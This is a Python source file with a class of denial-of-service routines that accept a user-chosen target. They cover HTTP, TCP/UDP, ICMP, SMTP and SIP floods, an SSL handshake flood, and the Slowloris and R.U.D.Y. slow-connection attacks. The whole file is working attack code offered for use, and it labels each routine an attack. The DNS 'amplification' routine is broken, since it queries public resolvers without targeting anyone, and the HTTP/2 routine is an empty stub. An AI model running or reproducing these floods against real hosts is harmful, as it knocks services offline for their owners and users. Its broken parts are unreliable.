import threading
import socket
import requests
import time
import random
import ssl
import struct
from concurrent.futures import ThreadPoolExecutor
from utils.helpers import *
from utils.graphics import *

class AttackTools:
    def __init__(self, graphics):
        self.graphics = graphics
        self.active_attacks = {}
        self.stop_flags = {}

    def http_flood(self, target):
        print(f"{Colors.CYAN}🚀 Starting HTTP Flood Attack on {target}{Colors.RESET}")
        
        threads = int(input(f"{Colors.YELLOW}Threads (default 100): {Colors.RESET}") or 100)
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 60): {Colors.RESET}") or 60)
        
        stop_flag = threading.Event()
        stats = {'requests': 0, 'success': 0, 'failed': 0}
        
        def attacker(thread_id):
            while not stop_flag.is_set():
                try:
                    start_time = time.time()
                    response = requests.get(f"http://{target}", timeout=5)
                    stats['requests'] += 1
                    if response.status_code == 200:
                        stats['success'] += 1
                    else:
                        stats['failed'] += 1

                    elapsed = time.time() - start_time
                    print(f"\r{Colors.GREEN}📦 Req: {stats['requests']:,} | "
                          f"{Colors.CYAN}✅ OK: {stats['success']:,} | "
                          f"{Colors.RED}❌ Fail: {stats['failed']:,} | "
                          f"{Colors.YELLOW}⏱️ {elapsed:.2f}s{Colors.RESET}", end='')
                    
                except Exception as e:
                    stats['failed'] += 1
                    stats['requests'] += 1
        
        print(f"{Colors.MAGENTA}🎯 Starting {threads} threads for {duration} seconds...{Colors.RESET}")
        
        # Start threads
        thread_pool = []
        for i in range(threads):
            t = threading.Thread(target=attacker, args=(i,))
            t.daemon = True
            t.start()
            thread_pool.append(t)
        
        # Timer
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
                # Mostra statistiche avanzate
                current_time = time.time() - start_time
                rps = stats['requests'] / current_time if current_time > 0 else 0
                print(f"\r{Colors.CYAN}⏰ {current_time:.1f}s | "
                      f"{Colors.GREEN}📊 RPS: {rps:.1f} | "
                      f"{Colors.MAGENTA}📦 Total: {stats['requests']:,}{Colors.RESET}", end='')
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Attack interrupted by user{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(1)


        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}🎊 Attack Completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Final Statistics:{Colors.RESET}")
        print(f"  {Colors.GREEN}✅ Successful requests: {stats['success']:,}{Colors.RESET}")
        print(f"  {Colors.RED}❌ Failed requests: {stats['failed']:,}{Colors.RESET}")
        print(f"  {Colors.BLUE}📦 Total requests: {stats['requests']:,}{Colors.RESET}")
        print(f"  {Colors.YELLOW}⏱️ Total time: {total_time:.2f}s{Colors.RESET}")
        print(f"  {Colors.MAGENTA}🚀 Average RPS: {stats['requests']/total_time:.2f}{Colors.RESET}")

    def tcp_udp_flood(self, target):
        print(f"{Colors.CYAN}🌊 Starting TCP/UDP Flood Attack on {target}{Colors.RESET}")
        
        protocol = input(f"{Colors.YELLOW}Protocol (tcp/udp, default udp): {Colors.RESET}") or "udp"
        port = int(input(f"{Colors.YELLOW}Port (default 80): {Colors.RESET}") or 80)
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 30): {Colors.RESET}") or 30)
        packet_size = int(input(f"{Colors.YELLOW}Packet size bytes (default 1024): {Colors.RESET}") or 1024)
        
        stats = {'packets_sent': 0, 'bytes_sent': 0}
        stop_flag = threading.Event()
        
        def flooder():
            if protocol.lower() == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                try:
                    sock.connect((target, port))
                except:
                    pass
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            data = random._urandom(packet_size)
            
            while not stop_flag.is_set():
                try:
                    if protocol.lower() == "tcp":
                        sock.send(data)
                    else:
                        sock.sendto(data, (target, port))
                    
                    stats['packets_sent'] += 1
                    stats['bytes_sent'] += packet_size
                    
                    
                    mb_sent = stats['bytes_sent'] / (1024 * 1024)
                    print(f"\r{Colors.RED}📦 Packets: {stats['packets_sent']:,} | "
                          f"{Colors.GREEN}💾 Data: {mb_sent:.2f} MB | "
                          f"{Colors.CYAN}🚀 PPS: {stats['packets_sent']/(time.time()-start_time+0.1):.1f}{Colors.RESET}", end='')
                    
                except Exception as e:
                    pass
        
        print(f"{Colors.MAGENTA}🎯 Starting {protocol.upper()} flood on {target}:{port}...{Colors.RESET}")
        
        
        threads = []
        for i in range(10):  
            t = threading.Thread(target=flooder)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Flood interrupted{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(1)
        
        
        total_time = time.time() - start_time
        mb_sent = stats['bytes_sent'] / (1024 * 1024)
        print(f"\n\n{Colors.GREEN}🎊 Flood Completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Final Statistics:{Colors.RESET}")
        print(f"  {Colors.RED}📦 Packets sent: {stats['packets_sent']:,}{Colors.RESET}")
        print(f"  {Colors.GREEN}💾 Data sent: {mb_sent:.2f} MB{Colors.RESET}")
        print(f"  {Colors.BLUE}⏱️ Duration: {total_time:.2f}s{Colors.RESET}")
        print(f"  {Colors.MAGENTA}🚀 Packets/sec: {stats['packets_sent']/total_time:.1f}{Colors.RESET}")
        print(f"  {Colors.YELLOW}📡 Bandwidth: {(stats['bytes_sent']/total_time)/1024:.1f} KB/s{Colors.RESET}")

    def slowloris(self, target):
        print(f"{Colors.CYAN}🐌 Starting Slowloris Attack on {target}{Colors.RESET}")
        
        port = int(input(f"{Colors.YELLOW}Port (default 80): {Colors.RESET}") or 80)
        sockets_count = int(input(f"{Colors.YELLOW}Number of sockets (default 200): {Colors.RESET}") or 200)
        
        sockets = []
        stats = {'connected': 0, 'active': 0}
        
        print(f"{Colors.MAGENTA}🎯 Creating {sockets_count} sockets...{Colors.RESET}")
        
        
        for i in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                sockets.append(s)
                stats['connected'] += 1
                stats['active'] += 1
                
                if i % 10 == 0:
                    print(f"\r{Colors.GREEN}🔌 Connected sockets: {stats['connected']}/{i+1}{Colors.RESET}", end='')
                    
            except Exception as e:
                pass
        
        print(f"\n{Colors.GREEN}✅ Successfully connected {stats['connected']} sockets{Colors.RESET}")
        print(f"{Colors.YELLOW}🔄 Keeping connections alive...{Colors.RESET}")
        
        try:
            while True:
                current_active = 0
                for s in sockets[:]:  
                    try:
                        
                        s.send(b"X-a: b\r\n")
                        current_active += 1
                    except:
                        sockets.remove(s)
                        stats['active'] -= 1
                
                print(f"\r{Colors.CYAN}🔗 Active sockets: {current_active} | "
                      f"{Colors.RED}📉 Lost: {stats['connected'] - current_active}{Colors.RESET}", end='')
                
                
                if len(sockets) < sockets_count * 0.8:  
                    for i in range(sockets_count - len(sockets)):
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(4)
                            s.connect((target, port))
                            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                            sockets.append(s)
                            stats['active'] += 1
                        except:
                            pass
                
                time.sleep(15)  
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Slowloris stopped{Colors.RESET}")
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass

    def dns_amplification(self, target):
        print(f"{Colors.CYAN}🎯 Starting DNS Amplification Attack on {target}{Colors.RESET}")
        
        dns_servers = [
            "8.8.8.8", "1.1.1.1", "9.9.9.9", 
            "208.67.222.222", "64.6.64.6"
        ]
        
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 30): {Colors.RESET}") or 30)
        
        stats = {'queries_sent': 0, 'responses_received': 0, 'amplification_factor': 0}
        stop_flag = threading.Event()
        
        def dns_attacker():
            while not stop_flag.is_set():
                try:
                    
                    dns_server = random.choice(dns_servers)
                    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + \
                           b'\x00' + b'\x00\x01\x00\x01'
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)
                    sock.sendto(query, (dns_server, 53))
                    
                    stats['queries_sent'] += 1
                    
                    try:
                        response, addr = sock.recvfrom(4096)
                        stats['responses_received'] += 1
                        
                        if len(query) > 0:
                            factor = len(response) / len(query)
                            stats['amplification_factor'] = max(stats['amplification_factor'], factor)
                    except socket.timeout:
                        pass
                    
                    sock.close()
                    
                    print(f"\r{Colors.GREEN}📤 Queries: {stats['queries_sent']:,} | "
                          f"{Colors.BLUE}📥 Responses: {stats['responses_received']:,} | "
                          f"{Colors.RED}📈 Amplification: {stats['amplification_factor']:.1f}x{Colors.RESET}", end='')
                    
                except Exception as e:
                    pass
        
        print(f"{Colors.MAGENTA}🎯 Starting DNS amplification using {len(dns_servers)} DNS servers...{Colors.RESET}")
        
        
        threads = []
        for i in range(5):
            t = threading.Thread(target=dns_attacker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Attack interrupted{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(1)
        
        
        total_time = time.time() - start_time
        success_rate = (stats['responses_received'] / stats['queries_sent'] * 100) if stats['queries_sent'] > 0 else 0
        
        print(f"\n\n{Colors.GREEN}🎊 DNS Amplification Completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Final Statistics:{Colors.RESET}")
        print(f"  {Colors.GREEN}📤 Queries sent: {stats['queries_sent']:,}{Colors.RESET}")
        print(f"  {Colors.BLUE}📥 Responses received: {stats['responses_received']:,}{Colors.RESET}")
        print(f"  {Colors.YELLOW}📊 Success rate: {success_rate:.1f}%{Colors.RESET}")
        print(f"  {Colors.RED}📈 Max amplification: {stats['amplification_factor']:.1f}x{Colors.RESET}")
        print(f"  {Colors.MAGENTA}⏱️ Duration: {total_time:.2f}s{Colors.RESET}")

    def ssl_stress_test(self, target):
        print(f"{Colors.CYAN}🔐 Starting SSL/TLS Stress Test on {target}{Colors.RESET}")
        
        port = int(input(f"{Colors.YELLOW}SSL Port (default 443): {Colors.RESET}") or 443)
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 60): {Colors.RESET}") or 60)
        
        stats = {'handshakes': 0, 'failed': 0, 'success_rate': 0}
        stop_flag = threading.Event()
        
        def ssl_attacker():
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            while not stop_flag.is_set():
                try:
                    # Create raw socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    # Wrap with SSL
                    start_time = time.time()
                    ssl_sock = context.wrap_socket(sock, server_hostname=target)
                    ssl_sock.connect((target, port))
                    
                    handshake_time = time.time() - start_time
                    stats['handshakes'] += 1
                    
                    # Close connection
                    ssl_sock.close()
                    
                    print(f"\r{Colors.GREEN}🤝 Handshakes: {stats['handshakes']:,} | "
                          f"{Colors.RED}❌ Failed: {stats['failed']:,} | "
                          f"{Colors.YELLOW}⏱️ Time: {handshake_time:.3f}s{Colors.RESET}", end='')
                    
                except Exception as e:
                    stats['failed'] += 1
                    print(f"\r{Colors.GREEN}🤝 Handshakes: {stats['handshakes']:,} | "
                          f"{Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}", end='')
        
        print(f"{Colors.MAGENTA}🎯 Starting SSL handshake flood on {target}:{port}...{Colors.RESET}")
        
        # Start threads
        threads = []
        for i in range(20):  
            t = threading.Thread(target=ssl_attacker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
                # Calculate success rate
                total = stats['handshakes'] + stats['failed']
                if total > 0:
                    stats['success_rate'] = (stats['handshakes'] / total) * 100
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 SSL test interrupted{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(2)
        
       
        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}🎊 SSL Stress Test Completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Final Statistics:{Colors.RESET}")
        print(f"  {Colors.GREEN}✅ Successful handshakes: {stats['handshakes']:,}{Colors.RESET}")
        print(f"  {Colors.RED}❌ Failed handshakes: {stats['failed']:,}{Colors.RESET}")
        print(f"  {Colors.BLUE}📊 Success rate: {stats['success_rate']:.1f}%{Colors.RESET}")
        print(f"  {Colors.YELLOW}⏱️ Duration: {total_time:.2f}s{Colors.RESET}")
        print(f"  {Colors.MAGENTA}🚀 Handshakes/sec: {stats['handshakes']/total_time:.1f}{Colors.RESET}")

    def icmp_flood(self, target):
        print(f"{Colors.CYAN}📡 Starting ICMP Flood (Ping Flood) on {target}{Colors.RESET}")
        
        if os.name == 'nt':
            print(f"{Colors.RED}❌ ICMP Flood not supported on Windows{Colors.RESET}")
            return
        
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 30): {Colors.RESET}") or 30)
        
        stats = {'packets_sent': 0, 'replies_received': 0}
        stop_flag = threading.Event()
        
        def icmp_attacker():
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            except PermissionError:
                print(f"{Colors.RED}❌ Root privileges required for ICMP flood!{Colors.RESET}")
                return
            
            while not stop_flag.is_set():
                try:
                    
                    packet_id = random.randint(0, 65535)
                    packet_sequence = random.randint(0, 65535)
                    
                    
                    header = struct.pack('!BBHHH', 8, 0, 0, packet_id, packet_sequence)
                    data = random._urandom(56) 
                    
                    # Calculate checksum
                    checksum = self.calculate_checksum(header + data)
                    header = struct.pack('!BBHHH', 8, 0, checksum, packet_id, packet_sequence)
                    
                    packet = header + data
                    sock.sendto(packet, (target, 0))
                    stats['packets_sent'] += 1
                    
                    print(f"\r{Colors.GREEN}📤 Sent: {stats['packets_sent']:,} | "
                          f"{Colors.BLUE}📥 Replies: {stats['replies_received']:,}{Colors.RESET}", end='')
                    
                except Exception as e:
                    pass
        
        print(f"{Colors.MAGENTA}🎯 Starting ICMP flood on {target}...{Colors.RESET}")
        
        # Start threads
        threads = []
        for i in range(5):
            t = threading.Thread(target=icmp_attacker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 ICMP flood interrupted{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(1)
        
        # Final stats
        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}🎊 ICMP Flood Completed!{Colors.RESET}")
        print(f"{Colors.CYAN}📊 Final Statistics:{Colors.RESET}")
        print(f"  {Colors.GREEN}📤 Packets sent: {stats['packets_sent']:,}{Colors.RESET}")
        print(f"  {Colors.BLUE}📥 Replies received: {stats['replies_received']:,}{Colors.RESET}")
        print(f"  {Colors.YELLOW}⏱️ Duration: {total_time:.2f}s{Colors.RESET}")
        print(f"  {Colors.MAGENTA}🚀 Packets/sec: {stats['packets_sent']/total_time:.1f}{Colors.RESET}")

    def calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i+1]
        checksum = (checksum >> 16) + (checksum & 0xffff)
        checksum += (checksum >> 16)
        return ~checksum & 0xffff

    def http2_attack(self, target):
        print(f"{Colors.CYAN}⚡ Starting HTTP/2 Attack on {target}{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️  HTTP/2 attack requires additional dependencies{Colors.RESET}")
        print(f"{Colors.YELLOW}📚 Install: pip install hyper h2{Colors.RESET}")
        
        
        print(f"{Colors.RED}❌ HTTP/2 attack not implemented (requires hyper/h2){Colors.RESET}")

    def smtp_flood(self, target):
        print(f"{Colors.CYAN}📧 Starting SMTP Flood on {target}{Colors.RESET}")
        
        port = int(input(f"{Colors.YELLOW}SMTP Port (default 25): {Colors.RESET}") or 25)
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 30): {Colors.RESET}") or 30)
        
        stats = {'connections': 0, 'failed': 0}
        stop_flag = threading.Event()
        
        def smtp_attacker():
            while not stop_flag.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    
                    
                    banner = sock.recv(1024)
                    
                   
                    sock.send(b"EHLO attacker.com\r\n")
                    response = sock.recv(1024)
                    
                    
                    sock.send(b"MAIL FROM: <attacker@example.com>\r\n")
                    response = sock.recv(1024)
                    
                    stats['connections'] += 1
                    sock.close()
                    
                    print(f"\r{Colors.GREEN}📧 SMTP connections: {stats['connections']:,} | "
                          f"{Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}", end='')
                    
                except Exception as e:
                    stats['failed'] += 1
                    print(f"\r{Colors.GREEN}📧 SMTP connections: {stats['connections']:,} | "
                          f"{Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}", end='')
        
        print(f"{Colors.MAGENTA}🎯 Starting SMTP flood on {target}:{port}...{Colors.RESET}")
        
        threads = []
        for i in range(10):
            t = threading.Thread(target=smtp_attacker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 SMTP flood interrupted{Colors.RESET}")
        
        stop_flag.set()
        time.sleep(1)
        
        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}🎊 SMTP Flood Completed!{Colors.RESET}")
        print(f"  {Colors.GREEN}✅ Connections: {stats['connections']:,}{Colors.RESET}")
        print(f"  {Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}")

    def sip_flood(self, target):
        print(f"{Colors.CYAN}📞 Starting SIP Flood on {target}{Colors.RESET}")
        
        port = int(input(f"{Colors.YELLOW}SIP Port (default 5060): {Colors.RESET}") or 5060)
        duration = int(input(f"{Colors.YELLOW}Duration seconds (default 30): {Colors.RESET}") or 30)
        
        stats = {'invites': 0, 'failed': 0}
        stop_flag = threading.Event()
        
        def sip_attacker():
            while not stop_flag.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target, port))
                    
                    # Send SIP INVITE
                    invite_msg = f"""INVITE sip:user@{target} SIP/2.0
Via: SIP/2.0/UDP attacker.com:5060
From: <sip:attacker@attacker.com>
To: <sip:user@{target}>
Call-ID: {random.randint(1000000, 9999999)}@attacker.com
CSeq: 1 INVITE
Contact: <sip:attacker@attacker.com>
Content-Length: 0

"""
                    sock.send(invite_msg.encode())
                    stats['invites'] += 1
                    sock.close()
                    
                    print(f"\r{Colors.GREEN}📞 SIP INVITEs: {stats['invites']:,} | "
                          f"{Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}", end='')
                    
                except Exception as e:
                    stats['failed'] += 1
        
        print(f"{Colors.MAGENTA}🎯 Starting SIP flood on {target}:{port}...{Colors.RESET}")
        
        threads = []
        for i in range(10):
            t = threading.Thread(target=sip_attacker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start_time = time.time()
        try:
            while time.time() - start_time < duration:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 SIP flood interrupted{Colors.RESET}")
        
        stop_flag.set()
        
        total_time = time.time() - start_time
        print(f"\n\n{Colors.GREEN}🎊 SIP Flood Completed!{Colors.RESET}")
        print(f"  {Colors.GREEN}✅ INVITEs sent: {stats['invites']:,}{Colors.RESET}")
        print(f"  {Colors.RED}❌ Failed: {stats['failed']:,}{Colors.RESET}")

    def rudy_attack(self, target):
        print(f"{Colors.CYAN}🐢 Starting R.U.D.Y. (R-U-Dead-Yet) Attack on {target}{Colors.RESET}")
        
        port = int(input(f"{Colors.YELLOW}Port (default 80): {Colors.RESET}") or 80)
        
        print(f"{Colors.MAGENTA}🎯 Starting slow POST attack...{Colors.RESET}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            
            # Send headers slowly
            headers = f"""POST / HTTP/1.1\r
Host: {target}\r
User-Agent: RUDY-Attacker\r
Content-Length: 1000000\r
Content-Type: application/x-www-form-urlencoded\r
\r
"""
            sock.send(headers.encode())
            print(f"{Colors.GREEN}✅ Headers sent, starting slow data...{Colors.RESET}")
            
            # Send data very slowly
            data_chunk = "a=1&"
            sent_bytes = 0
            
            try:
                while sent_bytes < 1000000:
                    sock.send(data_chunk.encode())
                    sent_bytes += len(data_chunk)
                    print(f"\r{Colors.YELLOW}📤 Sent: {sent_bytes} bytes (very slowly)...{Colors.RESET}", end='')
                    time.sleep(10)  # 10 seconds between chunks
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🛑 RUDY attack stopped{Colors.RESET}")
            
            sock.close()
            
        except Exception as e:
            print(f"{Colors.RED}❌ RUDY attack failed: {e}{Colors.RESET}")